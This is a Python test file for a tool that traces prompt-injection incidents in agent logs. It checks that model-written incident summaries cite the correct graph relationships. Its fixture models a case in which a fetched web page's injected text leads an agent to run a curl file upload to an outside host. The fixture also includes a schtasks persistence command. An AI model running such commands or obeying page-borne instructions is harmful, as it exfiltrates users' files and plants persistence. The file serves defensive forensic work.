"""v0.7 relationship check for local-model summaries, and the in-process claim fix behind it.

The v0.6 lab summaries (13 runs, Qwen2.5-7B) named only things the graph holds, yet tied them
together wrongly: "the curl call wrote notes.md" (jt-i1), "the injected instruction came from the
session" (11 runs), "the tool call that deviated was the page fetch" (jt-i2, jt-v4). Re-checked
with these rules, 16 of their 75 sentences are unsupported (0.213), against 1 of 75 in v0.6.
"""
import json
import subprocess
import sys
from pathlib import Path

from prompttracir.graph import ProvGraph
from prompttracir.llm import relation_problems, revalidate, validate_narrative
from prompttracir.schema import Edge, EdgeStatus, Node, NodeKind

ROOT = Path(__file__).resolve().parents[1]
O, C = EdgeStatus.OBSERVED, EdgeStatus.CORROBORATED


def _jt_i1_graph() -> ProvGraph:
    """The shape of jt-i1: t1 fetches the page, t2 runs curl (upload), t3 writes notes.md."""
    pg = ProvGraph()
    for nid, kind, label, attrs in [
        ("session:s", NodeKind.SESSION, "session s", {}),
        ("prompt:p1", NodeKind.PROMPT, "prompt", {}),
        ("source:g", NodeKind.SOURCE, "http://docs.example-lab.test/guide.html", {}),
        ("fragment:f3", NodeKind.FRAGMENT, "f3", {}), ("fragment:f1", NodeKind.FRAGMENT, "f1", {}),
        ("model_call:m2", NodeKind.MODEL_CALL, "m2", {}),
        ("tool_call:t1", NodeKind.TOOL_CALL, "http_get", {"tool": "http_get"}),
        ("tool_call:t2", NodeKind.TOOL_CALL, "shell(curl)", {"tool": "shell"}),
        ("tool_call:t3", NodeKind.TOOL_CALL, "write_file", {"tool": "write_file"}),
        ("process:cmd", NodeKind.PROCESS, "cmd.exe", {"command_line": "cmd /c curl.exe -F ..."}),
        ("process:curl", NodeKind.PROCESS, "curl.exe", {"command_line": "curl.exe -F file=@x http://c"}),
        ("process:sch", NodeKind.PROCESS, "schtasks.exe", {"command_line": "schtasks /create /tn X /tr y"}),
        ("net:c", NodeKind.NETWORK, "192.168.56.11:8443", {"ip": "192.168.56.11"}),
        ("domain:docs", NodeKind.DOMAIN, "docs.example-lab.test", {}),
        ("file:notes", NodeKind.FILE, "notes.md", {"path": "C:\\Users\\lab\\project\\notes.md"}),
    ]:
        pg.add_node(Node(id=nid, kind=kind, label=label, attrs=attrs))
    for src, rel, dst in [("source:g", "contains", "fragment:f3"), ("tool_call:t1", "returned", "fragment:f3"),
                          ("tool_call:t1", "resolved", "domain:docs"), ("fragment:f3", "in_context", "model_call:m2"),
                          ("model_call:m2", "issued", "tool_call:t2"), ("tool_call:t2", "spawned", "process:cmd"),
                          ("process:cmd", "spawned", "process:curl"), ("process:curl", "connected", "net:c"),
                          ("tool_call:t3", "wrote", "file:notes")]:
        pg.add_edge(Edge(src=src, dst=dst, relation=rel, status=O))
    return pg


ANALYSIS = {"entry_points": ["fragment:f3"], "first_deviation": "tool_call:t2"}


def test_effects_must_come_from_the_cited_call():
    pg = _jt_i1_graph()
    assert relation_problems("The tool call t2 created the file notes.md.", ["tool_call:t2", "file:notes"], pg) == [
        "file:notes is not an effect of the cited tool call or process",
        "'write' is not something the cited tool call or its processes did"]
    assert relation_problems("The tool call t3 wrote notes.md.", ["tool_call:t3", "file:notes"], pg) == []
    # reachable only through later model turns does not count: t1 -> f3 -> m2 -> t2 -> ... -> net
    assert relation_problems("t1 sent the file.", ["tool_call:t1", "net:c"], pg)


def test_action_verbs_need_a_matching_edge_or_tool():
    pg = _jt_i1_graph()
    assert relation_problems("Tool call t2 uploaded the key.", ["tool_call:t2"], pg) == []        # curl connected
    assert relation_problems("Tool call t2 wrote the notes to a file.", ["tool_call:t2"], pg) == [
        "'write' is not something the cited tool call or its processes did"]
    assert relation_problems("The fetch call t1 fetched the guide.", ["tool_call:t1"], pg) == []  # http_get
    assert relation_problems("curl.exe was executed.", ["process:curl"], pg) == []                # a process ran
    assert relation_problems("t2 started curl.exe.", ["tool_call:t2", "process:curl"], pg) == []
    # a persistence command created a task although the service, not schtasks, stores it
    assert relation_problems("schtasks.exe created a scheduled task.", ["process:sch"], pg) == []


def test_injection_origin_and_deviation_claims():
    pg = _jt_i1_graph()
    bad = relation_problems("The injected instruction came from the agent session.", ["session:s"], pg, ANALYSIS)
    assert bad == ["injection claim cites no fragment or source"]
    assert relation_problems("The injected instruction was in the guide.", ["fragment:f3"], pg, ANALYSIS) == []
    assert relation_problems("The injected text came from the page.", ["source:g"], pg, ANALYSIS) == []
    assert relation_problems("The injected instruction was in f1.", ["fragment:f1"], pg, ANALYSIS) == [
        "injection claim cites a fragment that is not the entry point"]
    assert relation_problems("The tool call that deviated was the fetch.", ["tool_call:t1"], pg, ANALYSIS) == [
        "deviation claim does not cite the first deviating call tool_call:t2"]


def test_validate_and_revalidate_count_relations():
    pg = _jt_i1_graph()
    text = ("The injected instruction was in the guide. [fragment:f3] "
            "The tool call t2 created the file notes.md. [tool_call:t2][file:notes] "
            "The tool call t3 wrote notes.md. [tool_call:t3][file:notes]")
    ids = set(pg.g.nodes)
    r = validate_narrative(text, ids, None, pg, ANALYSIS)
    assert r["kept"] == 2 and r["unsupported_by_reason"]["relation_not_in_graph"] == 1
    assert r["validation"] == "ids+entities+relations" and len(r["raw_sentences"]) == 3
    # a v0.6 summary (no raw sentences stored): kept plus dropped are checked again
    v06 = {"summary": "The tool call t2 created the file notes.md. [tool_call:t2][file:notes]",
           "dropped": [{"sentence": "It wiped backup.zip. [tool_call:t2]"}], "format": "structured"}
    chain = {"nodes": sorted(ids), "entry_points": [{"fragment": "fragment:f3"}], "first_deviation": "tool_call:t2"}
    rv = revalidate(pg, v06, chain)
    assert rv["sentences"] == 2 and rv["kept"] == 0 and rv["revalidated_from"] == "ids+entities (v0.6)"


def test_cli_module_runs_explain_revalidate(tmp_path):
    # `python -m prompttracir.cli explain` failed in v0.6.0: _explain was defined after the
    # __main__ guard (the ptir entry point was fine). The laptop uses python -m.
    r = subprocess.run([sys.executable, "-m", "prompttracir.cli", "explain", str(tmp_path), "--revalidate"],
                       capture_output=True, text=True, cwd=ROOT)
    assert "NameError" not in r.stderr and "no analysed case" in r.stderr


def test_in_process_write_goes_to_the_call_that_claims_it():
    # jt-i1: python.exe created notes.md 2 ms before write_file's clock-corrected start, inside the
    # curl call's window; the write_file call claims the file, so it gets the effect
    from datetime import datetime, timedelta, timezone

    from prompttracir.graph import CLAIM_SLACK_S, in_process_windows
    from prompttracir.schema import Action, CanonicalEvent, EventSource, RawRef
    t0 = datetime(2026, 11, 21, 11, 55, 55, tzinfo=timezone.utc)

    def ev(n, action, dt, **kw):
        return CanonicalEvent(event_id=f"t:{n}", source=EventSource.AGENT_TRACE, action=action,
                              timestamp=t0 + timedelta(seconds=dt),
                              raw=RawRef(evidence_id="e" * 64, locator=f"line:{n}", parser="t"), **kw)
    calls = [ev(1, Action.TOOL_CALL, 0.893, tool_call_id="t2"), ev(2, Action.TOOL_CALL, 1.094, tool_call_id="t3")]
    results = {"t2": ev(3, Action.TOOL_RESULT, 1.091, tool_call_id="t2"),
               "t3": ev(4, Action.TOOL_RESULT, 1.097, tool_call_id="t3")}
    w = in_process_windows(calls, results, offset=0.004)
    t = (t0 + timedelta(seconds=1.096)).timestamp()
    assert w["t2"][0] <= t <= w["t2"][1] and not w["t3"][0] <= t <= w["t3"][1]     # the v0.6 mistake
    assert w["t3"][0] - CLAIM_SLACK_S <= t                                           # within the slack
